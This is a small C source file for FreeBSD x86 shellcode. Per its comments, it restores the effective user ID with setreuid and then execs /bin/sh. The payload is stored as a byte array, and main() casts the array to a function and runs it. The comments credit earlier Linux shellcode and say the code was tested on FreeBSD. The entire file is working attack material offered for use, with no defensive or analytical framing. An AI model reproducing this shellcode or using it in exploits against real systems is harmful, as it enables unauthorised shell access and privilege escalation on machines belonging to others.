/*
 * bsd/x86 setreuid/exec shellcode
 *
 * setreuid(geteuid(), geteuid()) and execve("/bin/sh", "/bin/sh", 0)
 * shellcode based on hkpco's setreuid/exec shellcode for linux
 * Tested on FreeBSD
*/

#include <stdio.h>
#include <string.h>

char shellcode[] =
 "\x31\xc0\xb0\x19\x50\xcd\x80\x50"
 "\x50\x31\xc0\xb0\x7e\x50\xcd\x80" // setreuid(geteuid(), getuid());
 "\xeb\x0d\x5f\x31\xc0\x50\x89\xe2"
 "\x52\x57\x54\xb0\x3b\xcd\x80\xe8"
 "\xee\xff\xff\xff/bin/sh"; // exec(/bin/sh)

int main()
{
int (*f)() = (int (*)())shellcode;
 printf("%d\n",strlen(shellcode));
f();
 return 0;
}